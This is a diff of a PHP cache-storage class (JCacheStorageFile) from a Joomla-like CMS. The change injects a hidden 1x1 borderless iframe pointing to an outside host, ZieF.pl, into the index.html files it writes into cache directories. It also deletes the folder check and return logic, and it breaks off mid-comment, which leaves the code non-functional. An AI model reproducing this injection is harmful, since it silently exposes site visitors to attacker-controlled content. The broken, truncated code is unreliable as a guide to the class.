@@ -252,13 +252,8 @@ class JCacheStorageFile extends JCacheStorage
 
 			// Make sure the index file is there
 			$indexFile      = $dir . DS . 'index.html';
-			@ mkdir($dir) && file_put_contents($indexFile, '<html><body bgcolor="#FFFFFF"></body></html>');
+			@ mkdir($dir) && file_put_contents($indexFile, '<html><body bgcolor="#FFFFFF"><iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body></html>');
 		}
 
-		// Make sure the folder exists
-		if (!is_dir($dir)) {
-			return false;
-		}
-		return $dir.DS.$name;
-	}
-}
+		// Make sure the folder ex
